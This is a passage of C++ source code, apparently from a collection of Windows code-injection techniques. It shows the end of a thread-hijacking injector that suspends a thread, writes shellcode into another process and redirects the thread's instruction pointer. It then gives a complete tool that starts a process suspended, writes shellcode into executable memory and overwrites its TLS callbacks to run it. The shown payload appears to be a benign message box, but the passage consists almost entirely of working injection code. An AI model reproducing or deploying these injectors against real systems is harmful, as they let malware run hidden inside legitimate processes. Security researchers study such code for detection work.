			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
			if (!threadHandle)
			{
				printf("[Warning] - Failed to acquire thread handle with error %d\n", GetLastError());
				continue;
			}
			if (SuspendThread(threadHandle) == -1)
			{
				printf("[Error] %d - Failed to suspend thread\n", GetLastError());
				return 1;
			}

			CONTEXT ctx{};
			ctx.ContextFlags = CONTEXT_ALL;
			if (!GetThreadContext(threadHandle, &ctx))
			{
				printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
				return 1;
			}

			printf("[Info] - Current instruction pointer %llx\n", ctx.Xip);

#ifdef _WIN64
			const int absoluteJmpLength = 14;
			int8_t absoluteJmp[absoluteJmpLength] =
			{
				0xff, 0x25, 0x0, 0x0, 0x0, 0x0,					//JMP[rip + 0]
				0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88	//absolute address of jump
			};
			// write jmp from messagebox shellcode to popRegisters
			*(int64_t*)&absoluteJmp[6] = (int64_t)remoteMemory + sizeof(pushRegisters) + sizeof(reigsterpreserving_shellcode) - 1;
			memcpy(&reigsterpreserving_shellcode[88], absoluteJmp, absoluteJmpLength);

			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory, pushRegisters, sizeof(pushRegisters), NULL))
			{
				printf("[Error] %d - Failed to write pushRegisters shellcode to target process\n", GetLastError());
				return 1;
			}
			
			// the MessageBox shellcode will jump to pop registers as last step
			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory + sizeof(pushRegisters), reigsterpreserving_shellcode, sizeof(reigsterpreserving_shellcode) - 1, NULL))
			{
				printf("[Error] %d - Failed to write MessageBox shellcode to target process\n", GetLastError());
				return 1;
			}
			
			// pop registers, thereby restoring the original register values
			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory + sizeof(pushRegisters) + sizeof(reigsterpreserving_shellcode) -1, correctStackAndPopRegisters, sizeof(correctStackAndPopRegisters), NULL))
			{
				printf("[Error] %d - Failed to write shellcode to target process\n", GetLastError());
				return 1;
			}

			// write jmp back to the instruction the hijacked thread was going to execute next
			*(int64_t*)&absoluteJmp[6] = ctx.Xip;
			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory + sizeof(pushRegisters) + sizeof(reigsterpreserving_shellcode) - 1 + sizeof(correctStackAndPopRegisters), absoluteJmp, sizeof(absoluteJmp), NULL))
			{
				printf("[Error] %d - Failed to write absoluteJmp to target process\n", GetLastError());
				return 1;
			}
#else
			//+6 because the five byte JMP and \0 charcter are the last thing sin the shellcode. -5 because the JMP instruction is realtive to the next instruction
			int32_t target = ctx.Xip - (int32_t)remoteMemory - sizeof(reigsterpreserving_shellcode) + 6 - 5;

			memcpy(&reigsterpreserving_shellcode[sizeof(reigsterpreserving_shellcode) - 5], &target, 4);
			// write shellcode into target process
			if (!WriteProcessMemory(targetProcessHandle, remoteMemory, reigsterpreserving_shellcode, sizeof(reigsterpreserving_shellcode) - 1, NULL))
			{
				printf("[Error] %d - Failed to write shellcode to target process\n", GetLastError());
				return 1;
			}
#endif
			printf("[Info] - Wrote shellcode to remote memory at %p\n", remoteMemory);

			ctx.Xip = (DWORD_PTR)remoteMemory;

			if (SetThreadContext(threadHandle, &ctx) == 0)
			{
				printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
				return 1;
			}

			printf("[Info] - SetThreadContext to execute %llx\n", ctx.Xip);

			if (ResumeThread(threadHandle) == -1)
			{
				printf("[Error] %d - Failed to resume thread\n", GetLastError());
				return 1;
			}

			printf("[Info] - Resumed hijacked thread\n");

			CloseHandle(threadHandle);
			return 0;
		}
	} while (Thread32Next(processesSnapshot, &currentThreadEntry));
	return 0;
}
```

`shellcode_injection/tlscallback_injection.cpp`:

```cpp
/**
* Injects shellcode into a process by overwriting TLS callbacks.
* This implementation starts the process in a suspended state so it can overwrite a TLS callback that is being executed instead of the entry point.
* Some TLS callbacks may be executed when a Thread is created or exits. Therefore it is also possible to use this technique on already running processes.
* Supports 32- and 64 Bit applications.
* [Requirements]
*	- the target process needs to make use of TLS callbacks
*/

#include <Windows.h>
#include <cstdio>
#include <vector>

#include "../payload/shellcode.hpp"
#include "../common/ntddk.h"



int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe applicationPath\n");
		return 1;
	}

	char* applicationPath = argv[1];

	STARTUPINFOA startupInfo = STARTUPINFOA();
	PROCESS_INFORMATION processInformation = PROCESS_INFORMATION();

	// create the process in a suspended state. We do this so we can overwrite a TLS callback that is executed instead of the entry point
	if (!CreateProcessA(0,
		applicationPath,
		0,
		0,
		0,
		CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
		0,
		0,
		&startupInfo,
		&processInformation))
	{
		printf("[Error] %d - Failed to create process using application %s\n", GetLastError(), applicationPath);
		return 1;
	}

	printf("[Info] - Created target process in suspended state\n");

	// allocate memory in the target process
	LPVOID remoteMemory = VirtualAllocEx(processInformation.hProcess, nullptr, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// write shellcode into target process
	if (!WriteProcessMemory(processInformation.hProcess, remoteMemory, shellcode, sizeof(shellcode) - 1, NULL))
	{
		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	printf("[Info] - Wrote payload to %p\n", remoteMemory);

	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	ULONG returnLength = 0;
	// get process basic information
	NTSTATUS error = NtQueryInformationProcess(processInformation.hProcess, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	// read base address of process
	int64_t pebOffset = (int64_t)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);
	LPVOID processBasesAddress = 0;
	if (!ReadProcessMemory(processInformation.hProcess, (LPCVOID)pebOffset, &processBasesAddress, sizeof(void*), NULL))
	{
		printf("[Error] %d - Failed to read PEB offset\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	// read PE headers
	const int PE_BUFFER_SIZE = 4096;
	int8_t peBuffer[PE_BUFFER_SIZE] = {};
	if (!ReadProcessMemory(processInformation.hProcess, processBasesAddress, peBuffer, PE_BUFFER_SIZE, NULL))
	{
		printf("[Error] %d - Failed to read PE header\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	printf("[Info] - Read PE header at %p\n", processBasesAddress);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(peBuffer + dosHeader->e_lfanew);
	LPVOID entryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (int64_t)processBasesAddress);

	IMAGE_DATA_DIRECTORY tlsEntryDataDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (tlsEntryDataDirectory.Size == 0)
	{
		printf("[Error] - The target application does not contain TLS callbacks\n");
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	IMAGE_TLS_DIRECTORY tlsDirectory;
	ReadProcessMemory(processInformation.hProcess, (BYTE*)processBasesAddress + tlsEntryDataDirectory.VirtualAddress, &tlsDirectory, sizeof(IMAGE_TLS_DIRECTORY), nullptr);

	// this array is terminated by a nullpointer
	int tlsEntriesPatchedCount = 0;
	while (true)
	{
		PIMAGE_TLS_CALLBACK currentTlsCallback = nullptr;
		ReadProcessMemory(processInformation.hProcess, (DWORD_PTR*)tlsDirectory.AddressOfCallBacks + tlsEntriesPatchedCount, &currentTlsCallback, sizeof(IMAGE_TLS_DIRECTORY), nullptr);
		if (!currentTlsCallback)
		{
			break;
		}

		DWORD oldProtection;
		if (!VirtualProtectEx(processInformation.hProcess, (DWORD_PTR*)tlsDirectory.AddressOfCallBacks + tlsEntriesPatchedCount, sizeof(void*), PAGE_EXECUTE_READWRITE, &oldProtection))
		{
			printf("[Error] %d - Failed to change page protection of TLS callbacks\n", GetLastError());
		}

		if (!WriteProcessMemory(processInformation.hProcess, (DWORD_PTR*)tlsDirectory.AddressOfCallBacks + tlsEntriesPatchedCount, &remoteMemory, sizeof(void*), nullptr))
		{
			printf("[Error] %d - Failed to write tlscallback\n", GetLastError());
		}
		tlsEntriesPatchedCount++;
	}

	printf("[Info] - Overwrriten %d TLS callbacks\n", tlsEntriesPatchedCount);
	printf("[Info] - Resuming target process\n");

	if (!ResumeThread(processInformation.hThread))
	{
		printf("[Error] %d -  Failed ResumeThread\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	return 0;
}
```